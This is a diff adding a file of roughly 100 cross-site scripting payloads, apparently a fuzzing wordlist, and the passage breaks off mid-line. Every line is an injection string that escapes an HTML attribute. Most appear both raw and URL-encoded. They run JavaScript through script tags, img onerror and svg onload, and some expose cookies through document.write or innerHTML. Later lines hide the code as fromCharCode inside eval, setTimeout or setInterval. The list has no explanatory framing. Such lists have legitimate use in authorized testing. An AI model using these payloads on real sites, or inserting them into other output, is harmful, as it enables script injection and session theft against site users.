@@ -1,0 +1,102 @@
+"><script>alert(1)</script>
+"><img/src=x onerror=alert(1)>
+'><script>alert(1)</script>
+'><img/src=x onerror=alert(1)>
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+%22%3E%3Cimg/src=x%20onerror=alert(1)%3E
+%27%3E%3Cscript%3Ealert(1)%3C/script%3E
+%27%3E%3Cimg/src=x%20onerror=alert(1)%3E
+<script>alert(1)</script>
+<img/src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+"><script>alert(document.cookie)</script>
+"><img/src=x onerror=alert(document.cookie)>
+'><svg/onload=alert(1)>
+'><script>alert(document.cookie)</script>
+'><img/src=x onerror=alert(document.cookie)>
+%22%3E%3Csvg/onload=alert(1)%3E
+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+%22%3E%3Cimg/src=x%20onerror=alert(document.cookie)%3E
+%27%3E%3Csvg/onload=alert(1)%3E
+%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+%27%3E%3Cimg/src=x%20onerror=alert(document.cookie)%3E
+<script>alert(document.cookie)</script>
+<img/src=x onerror=alert(document.cookie)>
+"><svg/onload=alert(document.cookie)>
+"><script>alert(window.location)</script>
+"><img/src=x onerror=alert(window.location)>
+'><svg/onload=alert(document.cookie)>
+'><script>alert(window.location)</script>
+'><img/src=x onerror=alert(window.location)>
+%22%3E%3Csvg/onload=alert(document.cookie)%3E
+%22%3E%3Cscript%3Ealert(window.location)%3C/script%3E
+%22%3E%3Cimg/src=x%20onerror=alert(window.location)%3E
+%27%3E%3Csvg/onload=alert(document.cookie)%3E
+%27%3E%3Cscript%3Ealert(window.location)%3C/script%3E
+%27%3E%3Cimg/src=x%20onerror=alert(window.location)%3E
+<script>alert(window.location)</script>
+<img/src=x onerror=alert(window.location)>
+"><svg/onload=alert(window.location)>
+"><script>document.write(document.cookie)</script>
+"><img/src=x onerror=document.write(document.cookie)>
+'><svg/onload=alert(window.location)>
+'><script>document.write(document.cookie)</script>
+'><img/src=x onerror=document.write(document.cookie)>
+%22%3E%3Csvg/onload=alert(window.location)%3E
+%22%3E%3Cscript%3Edocument.write(document.cookie)%3C/script%3E
+%22%3E%3Cimg/src=x%20onerror=document.write(document.cookie)%3E
+%27%3E%3Csvg/onload=alert(window.location)%3E
+%27%3E%3Cscript%3Edocument.write(document.cookie)%3C/script%3E
+%27%3E%3Cimg/src=x%20onerror=document.write(document.cookie)%3E
+<script>document.write(document.cookie)</script>
+<img/src=x onerror=document.write(document.cookie)>
+"><svg/onload=document.write(document.cookie)>
+"><script>document.body.innerHTML=document.cookie</script>
+"><img/src=x onerror=document.body.innerHTML=document.cookie>
+'><svg/onload=document.write(document.cookie)>
+'><script>document.body.innerHTML=document.cookie</script>
+'><img/src=x onerror=document.body.innerHTML=document.cookie>
+%22%3E%3Csvg/onload=document.write(document.cookie)%3E
+%22%3E%3Cscript%3Edocument.body.innerHTML=document.cookie%3C/script%3E
+%22%3E%3Cimg/src=x%20onerror=document.body.innerHTML=document.cookie%3E
+%27%3E%3Csvg/onload=document.write(document.cookie)%3E
+%27%3E%3Cscript%3Edocument.body.innerHTML=document.cookie%3C/script%3E
+%27%3E%3Cimg/src=x%20onerror=document.body.innerHTML=document.cookie%3E
+<script>document.body.innerHTML=document.cookie</script>
+<img/src=x onerror=document.body.innerHTML=document.cookie>
+"><svg/onload=document.body.innerHTML=document.cookie>
+"><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+"><img/src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+'><svg/onload=document.body.innerHTML=document.cookie>
+'><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+'><img/src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+%22%3E%3Csvg/onload=document.body.innerHTML=document.cookie%3E
+%22%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41))%3C/script%3E
+%22%3E%3Cimg/src=x%20onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))%3E
+%27%3E%3Csvg/onload=document.body.innerHTML=document.cookie%3E
+%27%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41))%3C/script%3E
+%27%3E%3Cimg/src=x%20onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))%3E
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img/src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+"><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+"><script>setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)</script>
+"><img/src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)>
+'><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+'><script>setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)</script>
+'><img/src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)>
+%22%3E%3Csvg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))%3E
+%22%3E%3Cscript%3EsetTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)%3C/script%3E
+%22%3E%3Cimg/src=x%20onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)%3E
+%27%3E%3Csvg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))%3E
+%27%3E%3Cscript%3EsetTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)%3C/script%3E
+%27%3E%3Cimg/src=x%20onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)%3E
+<script>setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)</script>
+<img/src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)>
+"><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+"><script>setInterval(String.fromCharCode(97,108,101,114,116,40,49,41),1)</script>
+"><img/src=x onerror=setInterval(String.fromCharCode(97,108,101,114,116,40,49,41),1)>
+'><svg/onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),1)>
+'><script>setInterval(String.fromCharCode(97,108,101,114,116,40,49,41),1)</script>
+'><img/src=x onerror=setInterval(String.fromCharCode(97,108,101,114,116,40,49,41),1)>
+%22%3E%3Csvg/onload=setInterval(String.fromCharCode(97,108,101,114,116
+
